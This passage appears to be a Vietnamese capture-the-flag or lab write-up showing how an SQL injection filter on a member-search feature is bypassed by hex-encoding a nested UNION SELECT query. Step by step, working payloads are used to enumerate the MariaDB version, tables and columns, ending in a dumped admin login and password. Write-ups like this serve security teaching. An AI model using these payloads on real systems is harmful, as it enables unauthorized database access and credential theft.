![image](https://github.com/user-attachments/assets/27a2b722-0119-46f0-97d6-d646a83b302f)

:v có thêm chức năng search member

![image](https://github.com/user-attachments/assets/e271743b-3687-4ccd-8e75-03511bc370db)

![image](https://github.com/user-attachments/assets/de41d415-b5d2-41e5-819d-d483d6623fdd)

=> có vẻ như các payload inject đã bị filter rồi :V

Dạo 1 vòng trên google ta tìm được thông tin trên hacktricks

![image](https://github.com/user-attachments/assets/f2103710-0a91-42ed-8d6d-981a690f79f2)

```
' union select login,password from users-- a
' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
=> vector mà ta có thể hướng tới là 2 query lồng nhau ( hash hex query 2 rồi lồng vào query 1 ) :V

Ta thử encode cái payload thành dạng hex

![image](https://github.com/user-attachments/assets/3e13d0d7-e07b-4a43-a8c6-0f712ad27ed0)

![image](https://github.com/user-attachments/assets/1e60ad07-543a-4882-a54b-ebd89647588f)

:V vẫn lỗi nhưng mà có thêm thông tin là dbs dùng MariaDB và cũng chứng tỏ encode sang mã hex đã thành công inject được

![image](https://github.com/user-attachments/assets/f8c715ad-b2eb-4db0-96b0-4cf5f175ee9a)

![image](https://github.com/user-attachments/assets/debeda2b-9736-40d1-a285-e8ff7f97a32d)

=> có 2 cột 

```
   'union select 'union select 1,2-- - -- -
=> 'union select  0x27756e696f6e2073656c65637420312c322d2d202d-- -
```
![image](https://github.com/user-attachments/assets/0a52b422-e396-4c1e-ae96-90a8e0a0bde6)

=> chỉ cột thứ 2 có thể inject

Inject MariaDB khá giống với MySQL nên ta có thể dùng cheatsheet của MySQL luôn. 
Lại vào PayloadsAllTheThings

```
   'union select 'union select NULL,@@version-- - -- -
=> 'union select 0x27756e696f6e2073656c656374204e554c4c2c404076657273696f6e2d2d202d-- -
```
![image](https://github.com/user-attachments/assets/4298ce31-78cb-4333-8a1f-bc1d937d7e16)

=> version
```
   'union select 'union select NULL,table_name from information_schema.tables where table_schema=database()-- - -- -
=> 'union select 0x27756e696f6e2073656c656374204e554c4c2c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d646174616261736528292d2d202d-- -
```
![image](https://github.com/user-attachments/assets/3886223b-e8d1-46f8-969c-874e637ce01a)

=> bảng users

```
 'union select 'union select NULL, group_concat(column_name) from information_schema.columns where table_name='users'-- - -- -
=> 'union select 0x27756e696f6e2073656c656374204e554c4c2c2067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d277573657273272d2d202d-- -
```
![image](https://github.com/user-attachments/assets/c4d9e560-8d8e-4b00-9b86-6c48141560cb)

=> 4 cột là id, login, password, email.

```
'union select 'union select NULL, group_concat(login,'~', password) from users-- - -- -
=> 'union select 0x27756e696f6e2073656c656374204e554c4c2c2067726f75705f636f6e636174286c6f67696e2c277e272c2070617373776f7264292066726f6d2075736572732d2d202d-- -
```
![image](https://github.com/user-attachments/assets/5832a7e2-7a1e-4644-b9c2-d56e3a3b97e3)

=> admin~qs89QdAs9A
